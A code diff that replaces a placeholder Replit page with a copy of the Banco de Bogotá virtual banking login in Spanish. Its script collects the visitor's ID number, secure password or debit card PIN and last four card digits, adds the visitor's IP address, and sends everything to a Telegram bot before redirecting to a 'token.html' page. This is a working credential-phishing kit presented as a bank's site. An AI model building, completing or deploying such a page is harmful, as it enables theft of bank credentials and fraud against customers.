@@ -1,16 +1,264 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width">
-  <title>replit</title>
-  <link href="style.css" rel="stylesheet" type="text/css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Banco de Bogotá - Banca Virtual</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+    body{background:#fff;display:flex;flex-direction:column;min-height:100vh}
+    .main-container{padding:20px;max-width:400px;width:100%;margin:0 auto;flex:1}
+    .welcome-section{display:flex;align-items:center;margin-bottom:20px}
+    .bank-logo{width:60px;height:60px;margin-right:15px}
+    .welcome-text{font-size:18px;color:#000;font-weight:normal}
+    /* HELP BANNER restaurado */
+    .help-banner{background:#0b66c2;color:#fff;border-radius:10px;padding:1px;display:flex;align-items:center;margin-bottom:20px}
+    .help-banner-image{width:60px;height:90px;object-fit:cover;border-radius:-20%;margin-right:15px}
+    .help-text{flex:1;font-size:12px}
+    .help-title{font-size:12px;margin-bottom:10px;font-weight:normal}
+    .help-link{color:#fff;text-decoration:none;display:flex;align-items:center;font-weight:normal}
+    /* resto */
+    .login-container{background:#fff;border-radius:10px;padding:20px;box-shadow:0 2px 5px rgba(0,0,0,0.1)}
+    .tab-container{display:flex;border-bottom:1px solid #ddd;margin-bottom:20px}
+    .tab{flex:1;text-align:center;padding:10px;font-size:16px;color:#777;cursor:pointer}
+    .tab.active{color:#0b66c2;border-bottom:3px solid #0b66c2;font-weight:normal}
+    .info-message{background:#e8f4fc;border-left:4px solid #0b66c2;padding:10px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;color:#333}
+    .close-btn{color:#0b66c2;font-size:20px;cursor:pointer}
+    .formulario{margin-bottom:20px}
+    .form-group{margin-bottom:15px}
+    .form-label{display:block;font-size:14px;color:#555;margin-bottom:5px}
+    .form-row{display:flex;gap:10px;}
+    /* Proporción 30/70 solo para selects e inputs dentro de .form-row */
+    .form-row > select.form-control {
+      flex: 0.3; max-width:30%; padding:10px; border:1px solid #ccc; border-radius:5px; background:#fff; font-size:14px; outline:none;
+    }
+    .form-row > input.form-control {
+      flex: 0.7; width:auto; padding:10px; border:1px solid #ccc; border-radius:5px; font-size:14px; outline:none;
+    }
+    /* Para todos los demás inputs */
+    input.form-control {
+      padding:10px; border:1px solid #ccc; border-radius:5px; font-size:14px; outline:none; width:100%;
+    }
+    .password-input{position:relative}
+    .toggle-password{position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#0b66c2;font-size:12px;cursor:pointer}
+    .btn-login{width:100%;padding:12px;background:#f2f2f2;color:#555;border:none;border-radius:30px;font-size:16px;cursor:pointer;transition:background 0.3s;margin-bottom:20px}
+    .btn-login:hover{background:#e0e0e0}
+    .btn-login.active{background:#0b66c2;color:#fff;animation:pulse 1.5s infinite}
+    @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(11,102,194,0.4)}70%{box-shadow:0 0 0 10px rgba(11,102,194,0)}100%{box-shadow:0 0 0 0 rgba(11,102,194,0)}}
+    .actions-container{display:flex;border-top:1px solid #ddd;padding-top:15px}
+    .action-link{flex:1;text-align:center;color:#0b66c2;text-decoration:none;font-weight:bold;font-size:14px}
+    .bottom-indicator{width:30%;height:5px;background:#000;border-radius:3px;margin:20px auto}
+    footer{font-size:12px;color:#666;text-align:center;padding:10px 20px;border-top:1px solid #eee}
+  </style>
 </head>
-
 <body>
-  Hello world
-  <script src="script.js"></script>
-</body>
 
+  <div class="main-container">
+    <div class="welcome-section">
+      <img src="logo.png" alt="Logo BB" class="bank-logo">
+      <h1 class="welcome-text">Bienvenido a tu Banca Virtual</h1>
+    </div>
+
+    <div class="help-banner">
+      <img src="persona.png" alt="Soporte" class="help-banner-image">
+      <div class="help-text">
+        <div class="help-title">¿Nunca has ingresado a Banca Virtual?</div>
+        <a href="#" class="help-link">Aquí te decimos cómo hacerlo ›</a>
+      </div>
+    </div>
+
+    <div class="login-container">
+      <div class="tab-container">
+        <div class="tab active" data-target="clave-segura">Clave segura</div>
+        <div class="tab" data-target="tarjeta-debito">Tarjeta débito</div>
+      </div>
+
+      <div class="info-message">
+        <div id="info-text">
+          Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar.
+        </div>
+        <div class="close-btn">×</div>
+      </div>
+
+      <!-- Clave Segura -->
+      <div class="formulario" id="clave-segura">
+        <div class="form-group">
+          <label class="form-label">Identificación</label>
+          <div class="form-row">
+            <select id="idTypeCS" class="form-control">
+              <option value="C.C.">C.C.</option>
+              <option value="T.I.">T.I.</option>
+              <option value="C.E.">C.E.</option>
+              <option value="N.P.N.">N.P.N.</option>
+              <option value="N.P.E.">N.P.E.</option>
+              <option value="N.P.J.">N.P.J.</option>
+              <option value="P.S.">P.S.</option>
+              <option value="R.C.">R.C.</option>
+            </select>
+            <input type="text" id="idNumCS" class="form-control" placeholder="#">
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Clave segura</label>
+          <div class="password-input">
+            <input type="password" id="claveInput" class="form-control" placeholder="····">
+            <div class="toggle-password">Mostrar</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tarjeta Débito -->
+      <div class="formulario" id="tarjeta-debito" style="display:none;">
+        <div class="form-group">
+          <label class="form-label">Identificación</label>
+          <div class="form-row">
+            <select id="idTypeTD" class="form-control">
+              <option value="C.C.">C.C. Cédula de ciudadanía</option>
+              <option value="T.I.">T.I. Tarjeta de identidad</option>
+              <option value="C.E.">C.E. Cédula de extranjería</option>
+              <option value="N.P.N.">N.P.N. NIT persona natural</option>
+              <option value="N.P.E.">N.P.E. NIT persona extranjera</option>
+              <option value="N.P.J.">N.P.J. NIT persona jurídica</option>
+              <option value="P.S.">P.S. Pasaporte</option>
+              <option value="R.C.">R.C. Registro civil</option>
+            </select>
+            <input type="text" id="idNumTD" class="form-control" placeholder="#">
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Clave de tu tarjeta débito</label>
+          <div class="password-input">
+            <input type="password" id="claveTarjeta" class="form-control" placeholder="····">
+            <div class="toggle-password">Mostrar</div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">Últimos 4 dígitos de tu tarjeta débito</label>
+          <div class="password-input">
+            <input type="password" id="ult4Tarjeta" class="form-control" placeholder="····">
+            <div class="toggle-password">Mostrar</div>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn-login" id="btnIngresar" disabled>Ingresar</button>
+
+      <div class="actions-container">
+        <a href="#" class="action-link">Registrarme ›</a>
+        <a href="#" class="action-link">Olvidé mi clave ›</a>
+      </div>
+      <div class="bottom-indicator"></div>
+    </div>
+  </div>
+
+  <footer>
+    Este sitio está protegido por reCAPTCHA y aplican las políticas de privacidad y los términos de servicio de Google.
+  </footer>
+
+  <script>
+    // Pestañas
+    document.querySelectorAll('.tab').forEach(tab=>{
+      tab.addEventListener('click',function(){
+        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+        this.classList.add('active');
+        const tgt = this.dataset.target;
+        document.querySelectorAll('.formulario').forEach(f=>f.style.display='none');
+        document.getElementById(tgt).style.display='block';
+        document.getElementById('info-text').innerText =
+          tgt==='clave-segura'
+            ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar."
+            : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar.";
+        checkFields();
+      });
+    });
+
+    // Mostrar/Ocultar contraseña
+    document.querySelectorAll('.toggle-password').forEach(toggle=>{
+      toggle.addEventListener('click',function(){
+        const inp = this.previousElementSibling;
+        if(inp.type === 'password'){
+          inp.type = 'text';
+          this.textContent = 'Ocultar';
+        } else {
+          inp.type = 'password';
+          this.textContent = 'Mostrar';
+        }
+      });
+    });
+
+    // Cerrar mensaje informativo
+    document.querySelector('.close-btn').addEventListener('click', () => {
+      document.querySelector('.info-message').style.display = 'none';
+    });
+
+    // Activar/desactivar botón
+    const btn = document.getElementById('btnIngresar');
+    ['idNumCS','claveInput','idNumTD','claveTarjeta','ult4Tarjeta']
+      .map(id=>document.getElementById(id))
+      .forEach(el=>el.addEventListener('input', checkFields));
+
+    function checkFields(){
+      const active = document.querySelector('.tab.active').dataset.target;
+      let ok = false;
+      if(active === 'clave-segura'){
+        ok = idNumCS.value.trim()!=='' && claveInput.value.trim()!=='';
+      } else {
+        ok = idNumTD.value.trim()!=='' && claveTarjeta.value.trim()!=='' && ult4Tarjeta.value.trim()!=='';
+      }
+      btn.disabled = !ok;
+      btn.classList.toggle('active', ok);
+    }
+
+    // Enviar a Telegram con ubicación
+
+  
+  const token2 = import.meta.env.VITE_BOT_TOKEN;
+        const chatid2 = import.meta.env.VITE_CHAT_ID;
+
+
+  btn.addEventListener('click', async ()=>{
+    const active = document.querySelector('.tab.active').dataset.target;
+
+    const datos = {
+      tipo: active === 'clave-segura' ? 'Clave Segura' : 'Tarjeta Débito',
+      tipoId: active === 'clave-segura' ? idTypeCS.value : idTypeTD.value,
+      id: active === 'clave-segura' ? idNumCS.value : idNumTD.value,
+      clave: active === 'clave-segura' ? claveInput.value : claveTarjeta.value,
+      ult4: active === 'tarjeta-debito' ? ult4Tarjeta.value : null
+    };
+
+    try {
+      const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+      const ip = ipData.ip;
+
+      let mensaje = `🔔 *Nuevo acceso recibido:*\n\n`;
+      mensaje += `🔐 *Tipo:* ${datos.tipo}\n`;
+      mensaje += `🪪 *Tipo ID:* ${datos.tipoId}\n`;
+      mensaje += `🧾 *Identificación:* \`${datos.id}\`\n`;
+      mensaje += `🔑 *Clave:* \`${datos.clave}\`\n`;
+      if(datos.ult4) mensaje += `💳 *Últimos 4 dígitos:* \`${datos.ult4}\`\n`;
+      mensaje += `🌐 *IP:* \`${ip}\``;
+
+      await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type':'application/json' },
+          body: JSON.stringify({
+            chat_id: chatid2,
+            text: mensaje,
+            parse_mode: 'Markdown'
+          })
+        });
+
+      window.location.href = 'token.html';
+
+    } catch (error) {
+      console.error('Error al enviar mensaje a Telegram o al obtener IP:', error);
+      alert('Hubo un problema al procesar tu solicitud. Intenta nuevamente.');
+    }
+  });
+</script>
+  
+  </script>
+
+</body>
 </html>
